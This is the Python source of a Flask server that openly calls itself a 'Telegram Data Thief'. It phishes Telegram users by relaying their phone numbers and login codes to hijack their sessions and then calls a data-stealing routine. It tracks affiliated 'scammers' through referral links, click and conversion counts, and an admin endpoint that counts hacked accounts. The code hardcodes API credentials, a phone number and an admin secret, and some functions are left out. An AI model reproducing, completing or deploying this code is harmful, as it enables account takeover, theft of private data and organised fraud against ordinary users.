from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
import sqlite3
import os
import logging
from flask_cors import CORS
import secrets
import datetime

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'

# Секретный ключ для админских команд
ADMIN_SECRET = "cherryteam2024"

def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    
    # Таблица для сессий
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (phone TEXT PRIMARY KEY, 
                  phone_code_hash TEXT,
                  session_file TEXT,
                  ref_id TEXT,
                  status TEXT,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    # Таблица для скамеров
    c.execute('''CREATE TABLE IF NOT EXISTS scammers
                 (username TEXT PRIMARY KEY,
                  display_name TEXT,
                  ref_code TEXT UNIQUE,
                  total_clicks INTEGER DEFAULT 0,
                  total_conversions INTEGER DEFAULT 0,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    # Таблица для отслеживания кликов
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ref_code TEXT,
                  phone TEXT,
                  converted BOOLEAN DEFAULT FALSE,
                  clicked_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

def generate_ref_code():
    return secrets.token_urlsafe(8)

async def send_code_request(phone, ref_id=None):
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        phone_code_hash = sent_code.phone_code_hash
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO auth_sessions 
                    (phone, phone_code_hash, session_file, ref_id, status) 
                    VALUES (?, ?, ?, ?, ?)''',
                 (phone, phone_code_hash, session_file, ref_id, 'code_sent'))
        conn.commit()
        conn.close()
        
        await client.disconnect()
        logging.info(f"✅ Code sent to: {phone} via ref: {ref_id}")
        return {'status': 'code_sent'}
        
    except Exception as e:
        logging.error(f"❌ Send code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_code(phone, code):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT phone_code_hash, session_file, ref_id FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена.'}
        
        phone_code_hash, session_file, ref_id = result
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # ОБНОВЛЯЕМ СТАТИСТИКУ СКАМЕРА
            if ref_id:
                conn = sqlite3.connect('sessions.db')
                c = conn.cursor()
                c.execute("UPDATE scammers SET total_conversions = total_conversions + 1 WHERE ref_code = ?", (ref_id,))
                c.execute("UPDATE referrals SET converted = TRUE WHERE phone = ? AND ref_code = ?", (phone, ref_id))
                conn.commit()
                conn.close()
            
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
            conn.commit()
            conn.close()
            
            await steal_all_data(client, phone)
            await client.disconnect()
            
            logging.info(f"🎯 SUCCESSFUL LOGIN: {phone} via ref: {ref_id}")
            return {'status': 'success'}
            
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'password_required'}
            
        except PhoneCodeExpiredError:
            await client.disconnect()
            new_code_result = await send_code_request(phone, ref_id)
            if new_code_result['status'] == 'code_sent':
                return {'status': 'code_expired', 'message': 'Код истек. Новый код отправлен.'}
            else:
                return {'status': 'error', 'message': 'Код истек. Не удалось отправить новый.'}
            
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'status': 'invalid_code', 'message': 'Неверный код.'}
            
    except Exception as e:
        logging.error(f"❌ Verify code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

# ... остальные функции (verify_password, steal_all_data и т.д.) остаются без изменений ...

@app.route('/')
def home():
    return jsonify({'status': 'active', 'message': 'Telegram Data Thief'})

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    phone = data.get('phone')
    ref_id = data.get('ref_id')
    
    # ОБРАБОТКА КОМАНДЫ /cherryteam
    if phone and phone.startswith('/cherryteam'):
        parts = phone.split()
        if len(parts) >= 2:
            username = parts[1].replace('@', '').strip()
            return create_scammer_account(username)
        else:
            return jsonify({'status': 'error', 'message': 'Используйте: /cherryteam username'})
    
    # ОБЫЧНАЯ АВТОРИЗАЦИЯ
    logging.info(f"🔐 Auth: {phone} via ref: {ref_id}")
    
    # ОБНОВЛЯЕМ СТАТИСТИКУ КЛИКОВ
    if ref_id:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("INSERT INTO referrals (ref_code, phone) VALUES (?, ?)", (ref_id, phone))
        c.execute("UPDATE scammers SET total_clicks = total_clicks + 1 WHERE ref_code = ?", (ref_id,))
        conn.commit()
        conn.close()
    
    result = run_async(send_code_request(phone, ref_id))
    return jsonify(result)

def create_scammer_account(username):
    """Создает аккаунт скамера и возвращает ссылку"""
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        
        # Проверяем существует ли username
        c.execute("SELECT ref_code FROM scammers WHERE username = ?", (username,))
        existing = c.fetchone()
        
        if existing:
            ref_code = existing[0]
        else:
            # Создаем нового скамера
            ref_code = generate_ref_code()
            c.execute('''INSERT OR REPLACE INTO scammers 
                        (username, display_name, ref_code) 
                        VALUES (?, ?, ?)''',
                     (username, username, ref_code))
        
        conn.commit()
        conn.close()
        
        # Возвращаем ссылку БЕЗ username в URL
        ref_link = f"https://твой-сайт.onrender.com/?ref={ref_code}"
        
        return jsonify({
            'status': 'scammer_created',
            'ref_link': ref_link,
            'username': username,
            'message': f'✅ Ссылка создана! Делитесь ею: {ref_link}'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/admin/stats', methods=['POST'])
def admin_stats():
    """Админская статистика - ВАЖНО: НЕ МЕНЯЙ ЮЗЕРНЕЙМ!"""
    data = request.get_json()
    secret = data.get('secret')
    
    if secret != ADMIN_SECRET:
        return jsonify({'status': 'error', 'message': 'Неверный секретный ключ'})
    
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    
    # Получаем статистику всех скамеров
    c.execute('''SELECT username, display_name, ref_code, total_clicks, total_conversions, created_at 
                 FROM scammers ORDER BY total_conversions DESC''')
    scammers = c.fetchall()
    
    scammer_stats = []
    for scammer in scammers:
        scammer_stats.append({
            'username': scammer[0],
            'display_name': scammer[1],
            'ref_code': scammer[2],
            'total_clicks': scammer[3],
            'total_conversions': scammer[4],
            'created_at': scammer[5]
        })
    
    # Общая статистика
    c.execute("SELECT COUNT(*) FROM auth_sessions WHERE status='authenticated'")
    total_hacked = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM referrals WHERE converted = TRUE")
    total_conversions = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'status': 'admin_stats',
        'total_hacked_accounts': total_hacked,
        'total_conversions': total_conversions,
        'scammers': scammer_stats
    })

@app.route('/scammer/update', methods=['POST'])
def update_scammer():
    """Смена отображаемого имени скамера"""
    data = request.get_json()
    username = data.get('username')
    new_display_name = data.get('display_name')
    
    if not username or not new_display_name:
        return jsonify({'status': 'error', 'message': 'Укажите username и новое имя'})
    
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("UPDATE scammers SET display_name = ? WHERE username = ?", (new_display_name, username))
        
        if c.rowcount == 0:
            conn.close()
            return jsonify({'status': 'error', 'message': 'Скамер не найден'})
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': f'Имя обновлено на: {new_display_name}'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

# ... остальные маршруты (code, password, stats) ...

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    app.run(host='0.0.0.0', port=5000)
